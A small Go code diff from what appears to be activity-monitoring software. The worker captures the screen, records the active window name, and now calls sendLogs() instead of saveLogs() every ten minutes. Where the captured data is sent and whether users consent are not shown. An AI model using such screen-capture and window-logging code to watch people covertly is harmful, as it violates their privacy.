@@ -10,13 +10,13 @@ func startWorker(t time.Time) {
 		timeStampString := t.Format("2006-01-02 15:04:05")
 		layOut := "2006-01-02 15:04:05"
 		timeStamp, _ := time.Parse(layOut, timeStampString)
-		hr, min, sec := timeStamp.Clock()
-		fmt.Println(hr, min, sec)
+		_, min, sec := timeStamp.Clock()
+
 		if min%10 == 0 && sec == 0 {
-			saveLogs()
+			sendLogs()
 		}
 
-		if debug {
+		if true {
 			fmt.Println("capturing screen @", t.Format("2006-01-02 15:04:05"))
 		}
 		storeCurrentActiveWindowName(t)
